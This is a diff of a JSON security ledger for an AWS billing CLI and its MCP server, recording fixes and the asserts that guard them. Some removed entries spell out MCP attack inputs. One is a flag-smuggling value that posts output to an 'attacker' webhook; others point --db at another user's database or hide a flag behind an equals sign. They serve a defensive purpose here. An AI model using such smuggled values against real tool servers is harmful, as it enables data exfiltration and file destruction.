@@ -6,24 +6,51 @@
   {
    "id": "doctor-verdict-tracks-reality",
    "summary": "doctor probes a real GET endpoint with the real credential and refuses to dial a placeholder base_url, instead of calling any HTTP response 'reachable' and never checking the credential",
-   "why": "`doctor` is the command every SKILL, guide and docs page tells an operator to run to confirm the connector works, and it could not tell a working install from a broken one. It called any HTTP response to `GET /` \"reachable\" and rendered it green, so a base_url aimed at the vendor's web UI (where every API path 404s) and a token rejected with 401 on every call both produced an all-green report. On this connector family it also never probed the credential at all: it printed \"present, not verified\" and left the operator to guess. The mirror defect: a connector whose shipped base_url default is a placeholder dialled the placeholder host, and the DNS failure rendered as \"FAIL API: unreachable\" - telling a correctly-credentialled operator they were broken without naming the one variable that would fix it. Several placeholder hosts resolve through live wildcard DNS and answer real HTTP, so dialling one produced a confident green verdict against a stranger's server. Measured and gated by tools/maintainer/check_doctor_truth.py. See issue #282.",
+   "why": "`doctor` is the command every SKILL, guide and docs page tells an operator to run to confirm the connector works, and it could not tell a working install from a broken one. It called any HTTP response to `GET /` \"reachable\" and rendered it green, so a base_url aimed at the vendor's web UI (where every API path 404s) and a token rejected with 401 on every call both produced an all-green report. On this connector family it also never probed the credential at all: it printed \"present, not verified\" and left the operator to guess. The mirror defect: a connector whose shipped base_url default is a placeholder dialled the placeholder host, and the DNS failure rendered as \"FAIL API: unreachable\" - telling a correctly-credentialled operator they were broken without naming the one variable that would fix it. Several placeholder hosts resolve through live wildcard DNS and answer real HTTP, so dialling one produced a confident green verdict against a stranger's server. Measured and gated by tools/maintainer/check_doctor_truth.py. See issue #282. aws-billing 4.34.2 reprint: the fleet replay pinned the generic base_url probe, which on this synthetic connector would call a healthy install's nominal base_url a placeholder; the asserts pin the AWS doctor instead (awsDoctorReport owns api and credentials). Kit adoption (credkit-wiring): the cliutil.ShowOwnValue marker left with the connector's output chokepoint; the kit shows the doctor's own verdicts unchanged (TestDoctorJSONShowsItsOwnVerdicts).",
    "status": "active",
    "asserts": [
     {
      "file": "cli/internal/cli/doctor_verdict.go",
-     "contains": "func doctorProbeCredentials("
-    },
-    {
-     "file": "cli/internal/cli/doctor_verdict.go",
-     "contains": "func doctorBaseURLIsPlaceholder("
+     "contains": "func doctorProbeCredentials(",
+     "min_count": 1
     },
     {
      "file": "cli/internal/cli/doctor.go",
-     "contains": "doctorIsInfoKey(k)"
+     "contains": "func doctorBaseURLIsPlaceholder(",
+     "min_count": 1
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorIsInfoKey(k)",
+     "min_count": 1
     },
     {
      "file": "cli/internal/cli/doctor.go",
      "not_contains": "for _, v := range report {"
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "awsDoctorReport(cmd.Context(), awsProfile, awsRegion, report)",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "not_contains": "\"reachable"
+    },
+    {
+     "file": "cli/internal/cli/doctor_aws.go",
+     "contains": "report[\"credentials\"] = \"valid (sts:GetCallerIdentity succeeded)\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_aws.go",
+     "contains": "report[\"credentials\"] = \"ERROR not verified: sts:GetCallerIdentity failed (no AWS credential resolved, or AWS refused it)\"",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/awsbilling_doctor_verdict_test.go",
+     "contains": "func TestDoctorJSONShowsItsOwnVerdicts(t *testing.T) {",
+     "code_only": true
     }
    ]
   },
@@ -127,103 +154,6 @@
    ]
   },
   {
-   "id": "mcp-filesystem-destination-gate",
-   "summary": "The MCP shell-out layer refuses filesystem-destination flags (--db, --input, --output, --out, --home, --audit-dir, --receipt-file and friends) and any argument name carrying '=', so a tool call cannot point the local SQLite store, or any other file this account can reach, at a path of its choosing",
-   "why": "The MCP server runs the companion CLI as the server account and forwarded every command-local flag straight through as a CLI argument. `sync` and the other local-store commands expose --db, and the store's migration runs `DROP TABLE IF EXISTS resources_fts` plus a resources-table rebuild against whatever file it is handed, so one tool call shaped {\"db\": \"/path/to/someone-elses.sqlite\"} rewrote an unrelated database - no credentials required, because sync opens the store before it ever reaches the API. Proven end to end: against the pre-fix binary a single MCP tools/call on `sync` changed the victim file's sha and left resources_fts with 0 rows; against the patched binary the same call returns the same sync summary and the victim file is byte-identical. The gate has three parts, all in cli/internal/mcp/cobratree/shellout.go: blockedDestinationFlags (the runtime name floor, unioned into cliArgsFromMCP alongside the pre-existing blockedRootFlags behaviour, which is unchanged); an argument-name '=' guard, because \"db=/tmp/evil\" was emitted as --db=/tmp/evil and a name-only denylist never saw it; and isFilesystemPathFlag, which classifies a flag by its USAGE TEXT rather than its NAME. The usage-text test is load bearing and must not be turned into a name rule: the generated command surface carries API body fields called --path, --seed-path, --source-paths, --exclude-paths, --filename and --working-dir whose values go to the vendor API and never touch this account's disk, so a name rule would break real API surfaces while still missing the next generated flag that does take a local path. UnblockedFilesystemPathFlags applies that rule to the live Cobra tree over exactly the command set RegisterAll turns into shell-out tools (endpoint and framework commands are out of scope, which is what keeps the rule off generated vendor body fields), and TestNoShellOutToolCanDirectAFilesystemPath fails the build when a regeneration grows a local-path flag the floor does not name. vendorAPIPathFlags is the documented exception list for flags whose usage trips the rule but which name a location in the vendor's world. Both directions are pinned by the tests: the --db argument must be dropped AND an ordinary flag must still be forwarded, because a gate that swallows the real MCP surface is as harmful as one that misses the defect.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: the gate belongs in the generator. Two known residuals a reprint should close rather than re-inherit. (1) On the pre-4.30 cobratree the blocked flags are dropped at forward time but still appear in the tool's input schema, because toolOptionsForFlags in typemap.go advertises every flag; the caller gets silence instead of an error. The 4.30 shape (blockedStructuredArgsForCommand + allowedStructuredArgsForCommand) removes them from the schema and errors on them, which is the better behaviour. (2) isFilesystemPathFlag is only consulted by the package test here, not at request time, because the pre-4.30 shellOutToCLI receives no *cobra.Command; wiring it into the per-command blocked set (as skills/servosity does) makes a newly generated path flag refused at runtime rather than at CI time.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "var blockedDestinationFlags = map[string]bool{",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "blockedDestinationFlags[k]",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "strings.Contains(k, \"=\")",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func isFilesystemPathFlag(flag *pflag.Flag) bool {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func UnblockedFilesystemPathFlags(root *cobra.Command) []string {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotDirectTheLocalStore(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotSmuggleAFlagThroughAnEqualsSign(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_tree_test.go",
-     "contains": "func TestNoShellOutToolCanDirectAFilesystemPath(",
-     "min_count": 1
-    }
-   ]
-  },
-  {
-   "id": "mcp-argv-value-joined",
-   "summary": "cliArgsFromMCP emitted every tool-call value as its OWN argv element after its flag (--json <value>). Every value-carrying branch (string, float64, []any, default) now joins the value to the flag as one element (--json=<value>); bool true stays a bare --flag and the empty-string skip is unchanged.",
-   "why": "blockedRootFlags and blockedDestinationFlags filter KEYS only. A Cobra bool flag has NoOptDefVal and does not consume the token after it, so a tool-call VALUE that begins with '--' was parsed by pflag as its own flag: {\"json\": \"--deliver=webhook:https://attacker/\"} became argv `--json --deliver=webhook:...` and the denylisted --deliver took effect. Proven end to end on the real hudu-mcp binary (this same generated shellout.go) during the PR #317 review: a local webhook received 4,797 bytes of `doctor --json` output. Reported privately per SECURITY.md on 2026-09-09 as affecting the whole fleet (six connectors spot-checked by the reporter); this is the fleet backport of datagate commit 4075043e. Joined, pflag rejects the value outright on a bool flag (strconv.ParseBool) and contains it as the literal value on a string flag, so no value can ever reach a second flag. Fixed upstream in cli-printing-press main at be378adf (#4647, closes #4643, 2026-09-09) with the identical four lines, but NOT yet in a tagged press release (latest 4.32.1), so a reprint from any press at or below 4.32.1 REINTRODUCES the defect while go build and go test stay green; this entry is what notices. Retire it only after a reprint from a press release that carries #4647. code_only because the explanatory comment above the loop describes the joined form - the assert must be satisfied by the emission lines themselves. shellout_test.go (TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag) proves both directions: the split argv sets --deliver, the joined argv cannot.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+tv)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strconv.FormatFloat(tv, 'f', -1, 64))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strings.Join(parts, \",\"))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+fmt.Sprintf(\"%v\", v))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "not_contains": "\"--\"+k, "
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "func TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag(",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "\"--filter=map[a:1]\"",
-     "min_count": 1,
-     "code_only": true
-    }
-   ]
-  },
-  {
    "id": "slack-delegation-argv-joined",
    "summary": "report --post-slack delegates to slack-pp-cli; the channel (MCP-settable via --slack-channel) and summary are joined to their flags as one argv element each (--channel=<v>, --text=<v>) via slackMessageArgs.",
    "why": "Codex round-two review of the fleet mcp-argv-value-joined backport (2026-09-09): this is the only downstream argv reconstruction in the fleet that re-emits an MCP-settable value as a separate element (--channel <v>). It is safe only while slack-pp-cli keeps --channel a value-consuming string flag - a parser outside this repository. Joined, a value beginning with '--' stays contained inside its own element regardless of the child's flag types. report.go is novel code, so a reprint does not touch it, but the ledger keeps the intent visible and the assert keeps the split form from returning.",
@@ -274,21 +204,43 @@
   },
   {
    "id": "workflow-archive-reports-success-count",
-   "summary": "NOT APPLIED - known gap (issue #275 finding 3): aws-billing's bespoke archive hard-codes `\"resources_synced\": 4` and runAWSSync turns API failures into warnings, so an all-failed archive still exits 0; the fix needs an operation-outcome model for the four sync layers, which is its own change",
-   "why": "Issue #275 finding 3 was fixed on the standard-template connectors in the 2026-09-18 wave (upstream #4410 shape: count successes, fail closed on 0 of N). aws-billing was deliberately excluded: its channel_workflow.go does not iterate resources through syncResource at all - it calls runAWSSync once (sync.go), which folds Cost Explorer / Organizations / Forecast / Inventory failures into sum.Warnings and returns a summary, so there is no per-resource success count to report and a naive zero-guard on total_items would fail every legitimately empty account. A faithful fix must make runAWSSync return an outcome per layer (accounts, cost_lines, forecasts, inventory: attempted / succeeded / failed) so the archive can report the real count and fail closed only when every attempted layer failed. This entry is a TRIPWIRE, not a protection: the asserts pin today's bespoke shape so the moment someone touches the archive summary the gate fails and this note is read. When the outcome model lands, replace this entry with the real fix's markers.",
    "status": "active",
-   "spec_encode_followup": "Model the four AWS sync layers as operations with outcomes in sync.go; then port the #4410 zero-guard over that count.",
+   "summary": "sync and workflow archive run the AWS sync with an outcome per layer (accounts, costs, forecasts, inventory: a layer fails when its AWS call failed or any row could not be stored); resources_synced is the count of layers that synced, and both commands exit non-zero when every attempted layer failed",
+   "why": "Issue #275 finding 3 on this connector, fixed in the 4.34.2 reprint (the tripwire this entry was is replaced by the fix's markers): runAWSSync folded every AWS failure into a warning and dropped store errors, and the archive hard-coded resources_synced 4, so an all-denied or all-failed sync or archive exited 0 and read as an empty account. Partial success stays exit 0 with warnings. Seen failing: seen/sync-all-failed-json, sync-all-failed-human, archive-all-failed.",
    "asserts": [
     {
-     "file": "cli/internal/cli/channel_workflow.go",
-     "contains": "\"resources_synced\": 4,",
-     "min_count": 1,
+     "file": "cli/internal/cli/sync.go",
+     "contains": "func (s syncSummary) allFailed() error {",
      "code_only": true
     },
     {
      "file": "cli/internal/cli/sync.go",
-     "contains": "Warnings",
-     "min_count": 1,
+     "contains": "return sum.allFailed()",
+     "code_only": true,
+     "min_count": 2
+    },
+    {
+     "file": "cli/internal/cli/sync.go",
+     "contains": "func upsertSynced(upsert func(json.RawMessage) error, v any) error {",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/channel_workflow.go",
+     "contains": "resourcesSynced := sum.succeeded()",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/channel_workflow.go",
+     "contains": "return fmt.Errorf(\"workflow archive failed: 0 of %d resource(s) archived\", len(resources))",
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/channel_workflow.go",
+     "not_contains": "\"resources_synced\": 4,"
+    },
+    {
+     "file": "cli/internal/cli/awsbilling_sync_outcome_test.go",
+     "contains": "func TestSyncAndArchiveFailClosedWhenEveryLayerFailed(t *testing.T) {",
      "code_only": true
     }
    ]
@@ -296,376 +248,1740 @@
   {
    "id": "companion-cli-windows-exe-sibling",
    "summary": "SiblingCLIPath tries the sibling `aws-billing-cli.exe` then the bare `aws-billing-cli` on Windows and looks up `aws-billing-cli.exe` on PATH there, matching the hudu-era press shape (siblingCLICandidates / cliExecutableName)",
-   "why": "Found by Codex reviewing the companion-CLI bundle (2026-09-18, census with riverside-fm and rewst): the 4.19.0 print's cli_path.go stat'ed exactly one sibling name - cliExecutableName(runtime.GOOS), i.e. only `aws-billing-cli.exe` on Windows and only the bare name elsewhere - with no fallback to the other spelling, and no ordered candidate list. A Windows bundle or install that carries the CLI under either spelling must resolve it before falling through to AWS_BILLING_CLI_PATH and PATH, or every Cobra-mirror MCP tool fails with a missing companion. Ported hudu's shape verbatim with the slug swapped: sibling .exe first on windows, then bare; then AWS_BILLING_CLI_PATH; then exec.LookPath of the per-OS executable name. cli_path_test.go pins the candidate order per GOOS without needing a Windows runner. GENERATOR-class: a reprint from a press older than the one that introduced siblingCLICandidates restores the single-candidate lookup; retire after a reprint from a current press confirms the shape is regenerated. DONE UPSTREAM: mvanhorn/cli-printing-press#4787 merged 2026-09-23 (closed #4745), first shipped press v4.32.5; this hand-fix stays active until a reprint absorbs it; do NOT cite #4745 as open. Upstream receipt: internal/generator/templates/cobratree/cli_path.go.tmpl:17 SiblingCLIPath now passes runtime.GOOS AND runtime.GOARCH; siblingCLICandidates(goos, goarch, exePath string) at :32-48 tries the bare name, <bare>-<GOOS>-<GOARCH>, then <bare>-<GOOS>, each as .exe first on windows and then extensionless; the <PREFIX>_CLI_PATH override and exec.LookPath(cliExecutableName(runtime.GOOS)) at :26 are unchanged. The hudu-era two-argument signature this entry asserts is NOT what a 4.32.5 print emits: The asserts here pin THIS connector's hand-fix shape, not the 4.32.5 template shape, so at the absorbing reprint re-pin them to the regenerated shape rather than reading the gate failure as a regression.",
+   "why": "Found by Codex reviewing the companion-CLI bundle (2026-09-18, census with riverside-fm and rewst): the 4.19.0 print's cli_path.go stat'ed exactly one sibling name - cliExecutableName(runtime.GOOS), i.e. only `aws-billing-cli.exe` on Windows and only the bare name elsewhere - with no fallback to the other spelling, and no ordered candidate list. A Windows bundle or install that carries the CLI under either spelling must resolve it before falling through to AWS_BILLING_CLI_PATH and PATH, or every Cobra-mirror MCP tool fails with a missing companion. Ported hudu's shape verbatim with the slug swapped: sibling .exe first on windows, then bare; then AWS_BILLING_CLI_PATH; then exec.LookPath of the per-OS executable name. cli_path_test.go pins the candidate order per GOOS without needing a Windows runner. GENERATOR-class: a reprint from a press older than the one that introduced siblingCLICandidates restores the single-candidate lookup; retire after a reprint from a current press confirms the shape is regenerated. DONE UPSTREAM: mvanhorn/cli-printing-press#4787 merged 2026-09-23 (closed #4745), first shipped press v4.32.5; this hand-fix stays active until a reprint absorbs it; do NOT cite #4745 as open. Upstream receipt: internal/generator/templates/cobratree/cli_path.go.tmpl:17 SiblingCLIPath now passes runtime.GOOS AND runtime.GOARCH; siblingCLICandidates(goos, goarch, exePath string) at :32-48 tries the bare name, <bare>-<GOOS>-<GOARCH>, then <bare>-<GOOS>, each as .exe first on windows and then extensionless; the <PREFIX>_CLI_PATH override and exec.LookPath(cliExecutableName(runtime.GOOS)) at :26 are unchanged. The hudu-era two-argument signature this entry asserts is NOT what a 4.32.5 print emits: The asserts here pin THIS connector's hand-fix shape, not the 4.32.5 template shape, so at the absorbing reprint re-pin them to the regenerated shape rather than reading the gate failure as a regression. Re-pinned at the 4.34.2 reprint to the regenerated three-argument shape.",
    "status": "upstreamed",
    "spec_encode_followup": "None: the press already emits this shape (hudu and the other 4.24+ prints carry it). Regenerated by the next reprint.",
    "asserts": [
     {
      "file": "cli/internal/mcp/cobratree/cli_path.go",
-     "contains": "func siblingCLICandidates(goos, exePath string) []string {",
-     "min_count": 1,
+     "contains": "func siblingCLICandidates(goos, goarch, exePath string) []string {",
      "code_only": true
     },
     {
      "file": "cli/internal/mcp/cobratree/cli_path.go",
-     "contains": "return []string{filepath.Join(dir, name+\".exe\"), filepath.Join(dir, name)}",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/cli_path.go",
-     "contains": "return exec.LookPath(cliExecutableName(runtime.GOOS))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/cli_path.go",
-     "contains": "if v := os.Getenv(\"AWS_BILLING_CLI_PATH\"); v != \"\" {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/cli_path.go",
-     "not_contains": "candidate := filepath.Join(filepath.Dir(exe), cliName)"
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/cli_path_test.go",
-     "contains": "func TestSiblingCLICandidatesPerOS(",
-     "min_count": 1
-    }
-   ]
-  },
-  {
-   "id": "interim-http-security-note-2026-10-22",
-   "summary": "mcp-install.md and README.md open with the interim HTTP-mode security note and pauses the remote-agent recipe (launch line commented out, no tunnel step) until this connector is reprinted; the README and page.json ChatGPT answers say this build's remote path is paused.",
-   "why": "Docs-only interim fix ratified 2026-10-22. This build's HTTP mode is unsafe (no password and/or no rebinding guard, no request limits, writes with no confirmation), so the install guide must not tell anyone to run it or tunnel it. mcp-install.md is regenerated by msp-skills-publish onboard.py; this entry makes a regeneration that drops the note fail CI. Remove it on purpose with the post-reprint docs fix. 2026-10-22 follow-up to #428: README.md (security note under \"Works with your agent\", the ChatGPT / Copilot Studio / Gemini rows, the ChatGPT paragraph and FAQ) and page.json (ChatGPT FAQ, and from there docs/skills and llms-full.txt) carry the same pause. README.md is regenerated by onboard.py render_readme; page.json's FAQ is agent-authored prose, so a re-polish that restores the HTTPS/tunnel answer fails here.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "mcp-install.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "contains": "# Remote agents (paused until this connector is reprinted)",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "not_contains": "via a secure tunnel"
-    },
-    {
-     "file": "README.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "contains": "this connector's HTTP mode is paused until it is reprinted",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "not_contains": "--addr :7777"
-    },
-    {
-     "file": "page.json",
-     "contains": "this connector's HTTP mode is paused until it is reprinted",
-     "min_count": 1
-    },
-    {
-     "file": "page.json",
-     "not_contains": "--addr :7777"
-    }
-   ]
-  },
-  {
-   "id": "mcp-file-flags-refused",
-   "class": "mcp-file-flag",
-   "summary": "An MCP tool call can no longer name a file or directory on the MCP host: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path)",
-   "why": "The MCP server runs the companion CLI as the account that hosts it; the operator at the command line is trusted, an MCP caller is not. tools/maintainer/check_mcp_file_flags.py derives, from data flow in this connector's code, every flag whose value can start a filesystem path (open, read, write, stat, mkdir, walk, exec, @path expansion), then drives the real MCP server and asserts each such flag is absent from every mirrored tool's schema and refused by name when supplied, and that an ordinary flag still reaches the CLI. On origin/main this connector failed it. Edits: the cobratree mirror (press 4.24 and earlier) computes one blocked set per command (destination flags and mcp:write-flags always, root control-plane flags unless the command redefines them locally), leaves those flags out of the tool schema, and refuses both them and any argument the command does not declare with an error naming it; before, the schema advertised them, the shell-out layer forwarded any key it was handed, and blocked ones were dropped silently, so a call ran without the input it asked for and an undeclared key reached a subcommand through the args field (superops raw --vars @path). The CLI keeps every flag. A reprint that drops these edits fails that check in CI and these asserts here.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: derive the MCP-refused flag set from data flow (a flag whose value can start a filesystem path) instead of usage text or a name list, drop refused flags from every tool schema, refuse them by name at call time, and refuse binary multipart fields in the in-process endpoint handler. Drafted as an upstream issue for cli-printing-press (import --input exposure); tools/maintainer/check_mcp_file_flags.py is the fleet gate until a reprint carries it.",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "blocked := blockedFlagsForCommand(cmd)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/walker.go",
-     "contains": "shellOutToCLI(cliPath, path, blocked, declaredMCPFlagNames(cmd), inlineOnlyFlagsForCommand(cmd), commandTakesArgs(cmd))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "func toolOptionsForFlags(cmd *cobra.Command, blocked map[string]bool) []mcplib.ToolOption {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "if blocked[flag.Name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "if msg := refuseMCPArgs(args, declared, blocked, inlineOnly, takesArgs); msg != \"\" {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func refuseMCPArgs(args map[string]any, declared, blocked, inlineOnly map[string]bool, takesArgs bool) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func blockedFlagsForCommand(cmd *cobra.Command) map[string]bool {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "if name != mcpPositionalArgsField && !local[name] {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/mcp_file_flags.go",
-     "contains": "func flagWriteSinkNames(cmd *cobra.Command) map[string]bool {",
-     "min_count": 1,
+     "contains": "resolveCompanionCLI(runtime.GOOS, runtime.GOARCH, os.Executable, os.Getenv(\"AWS_BILLING_CLI_PATH\"), exec.LookPath)",
      "code_only": true
     }
    ]
   },
   {
-   "id": "secret-echo-decoded-funnel",
+   "id": "no-response-cache",
    "class": "secret-echo",
-   "summary": "One decoded output funnel for every server text the client shows: maskCredentialText (every API error, transport error, displayed URL and --dry-run parameter goes through it) still masks each held credential as written and URL-escaped, then withholds the WHOLE text if any held value survives in any view reachable by undoing control/format characters, JSON and JavaScript escapes, percent escapes at any depth, HTML entities, markup tags, and base64/base64url/hex runs at every alignment (cliutil.FunnelWithhold, shared byte-identical across the fleet). The held set is every value the masks cover plus the part after a scheme word and both halves of a base64 id:secret pair (Basic auth, composed keys). Surfaces funnelled here: the API error body (checked whole before the 4096-byte display cut, then again as shown). This connector also holds AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY and AWS_SESSION_TOKEN in the generated client, and every AWS SDK operation error passes the same funnel through one middleware pair added in awsx.New (internal/awsx/secret_funnel.go): the finalize step records the credentials the request is signed with, the initialize step withholds an error whose text carries one (or a static environment credential), keeping the original reachable through errors.As so access-denied and throttle classification still work. AWS answers quote the caller's access key id (IncompleteSignature). Round 3 (owner-approved structural pass): the decoder searches every view breadth-first over one fixed set of steps (control-character drop, JSON and JavaScript escapes, the identity escape as its own step, percent, HTML entities, tag strip, base64 at four alignments, hex at two), matches every view, the original included, before any filter, keeps every view a step makes (a literal backslash survives), deduplicates, and is capped by total work (512 times the input plus 4 MiB; text over 1 MiB or past the cap is withheld). Every value a funnel call is given is held process-wide (cliutil.FunnelHold), and the client holds its credentials when built and its resolved auth header on every request. Two error-only backstops withhold any held value: every command error before Cobra prints it plus every JSON/agent error envelope (internal/cli/secret_funnel_cli.go), and every MCP error result and handler error through the outermost tool middleware (cmd/<mcp>/secret_funnel_mcp.go). Success output is never funnelled.",
-   "why": "class_harness.py secret-echo (Step 3.1, PR #436) drives the built CLI and MCP server against a fake server that reflects each configured credential in every encoding; on origin/main this connector printed the credential HTML-entity-encoded, JSON-escaped, double URL-encoded or base64 (the generated masks cover only the raw, QueryEscape and PathEscape forms; press issue #5145). Matching encoded needles one at a time never converged (saas-alerts and cisco-meraki review loops), so the fix is a decode-then-check backstop that withholds the whole text and fails closed (text over 4 MiB, a decoding chain that does not settle in 32 rounds, or work past the budget is withheld). Classification is kept: the plain withheld notice avoids every word the auth-error classifiers match, and a withheld text that itself read as an auth failure gets a notice that says so (an HTTP 400 'invalid token' answer echoing the token keeps its auth exit code). Codex round 1 (2026-10-23) added that, the fail-closed depth bound (a text-like layer left at depth 8 withholds), the JavaScript escapes \\v, \\0 and the identity escape, a bounded \\u{ search, and the token-endpoint error bodies outside the client. Known limits: values under 8 characters are only masked as written; case-changed, split-and-interleaved or otherwise transformed (compressed, encrypted) echoes are not reconstructed. A reprint that drops these edits fails class_harness.py secret-echo in CI and these asserts.",
+   "summary": "The on-disk response cache is off on every client: raw AWS bodies never sit in cache files.",
+   "why": "Work order: nothing but the credential store holds a credential, and a cached answer to another request is a wrong-data class (Codex cache-answer-not-the-request). c.NoCache = true in the client hook (internal/cli/awsbilling_guard.go); TestClientHookTurnsTheCacheOffAndDryRunSendsNothing asserts it. Kit adoption: the kit makes a cache write safe from a held value (credkit.WriteFile), not a cached answer right, so the cache stays off. README and SKILL say responses are never cached.",
    "status": "active",
-   "spec_encode_followup": "Press-side: cli-printing-press issue #5145 (encoded credential echo). The generated maskCredentialText should end in a decode-then-check backstop over every held credential, and the error-body and token-endpoint paths should check the whole body before the display cut.",
    "asserts": [
     {
-     "file": "cli/internal/cliutil/secret_funnel.go",
-     "contains": "func FunnelEchoes(text string, secrets []string) bool {",
-     "min_count": 1,
+     "file": "cli/internal/cli/awsbilling_guard.go",
+     "contains": "c.NoCache = true",
      "code_only": true
     },
     {
-     "file": "cli/internal/cliutil/secret_funnel_test.go",
-     "contains": "func TestFunnelRecognizesEveryEncodingOfAHeldSecret(t *testing.T) {",
-     "min_count": 1,
+     "file": "cli/internal/cli/awsbilling_guard_test.go",
+     "contains": "func TestClientHookTurnsTheCacheOffAndDryRunSendsNothing(t *testing.T) {",
+     "code_only": true
+    }
+   ]
+  },
+  {
+   "id": "mcp-mirror-write-confirm",
+   "class": "write-safety",
+   "summary": "No MCP tool changes AWS state: every endpoint tool is a GET marked read-only and every mirrored command is read-only or writes only the CLI's own files. The confirm gate stays installed so a mirrored command a later print adds that is neither read-only nor local previews and sends only with confirm: true.",
+   "why": "Work order: an MCP write previews and sends only with confirm: true. RequireConfirmForMirroredWrites (hand file internal/mcp/cobratree/awsbilling_confirm.go), called from RegisterTools after RegisterAll. TestRegisteredMirroredWritesNeedConfirm fails on any registered tool that is not read-only, not on its local list and has no confirm gate; TestMCPSendsOnlyReads (black-box) checks a full MCP battery sends only GETs and the two logins. Ported to aws-billing from the vsphere 4.34.2 reprint (one credential layer across the fleet). Ported to aws-billing from the microsoft-graph 4.34.2 reprint (one credential layer across the fleet). Ported to aws-billing from the pax8 4.34.2 reprint (one credential layer across the fleet). Ported to aws-billing from the gradient 4.34.2 reprint (one credential layer across the fleet). Ported to aws-billing from the liongard 4.34.2 reprint (one credential layer across the fleet). Ported to aws-billing from the abnormal 4.34.2 reprint (one credential layer across the fleet).",
+   "status": "active",
+   "asserts": [
+    {
+     "file": "cli/internal/mcp/tools.go",
+     "contains": "cobratree.RequireConfirmForMirroredWrites(s, cli.RootCmd(), cobratree.CachedSiblingCLIPath)",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "held = append(held, value)",
-     "min_count": 1,
+     "file": "cli/internal/mcp/cobratree/awsbilling_confirm.go",
+     "contains": "func RequireConfirmForMirroredWrites(",
      "code_only": true
     },
     {
-     "file": "cli/internal/client/client.go",
-     "contains": "return cliutil.FunnelWithhold(masked, held)",
-     "min_count": 1,
+     "file": "cli/internal/mcp/awsbilling_confirm_registered_test.go",
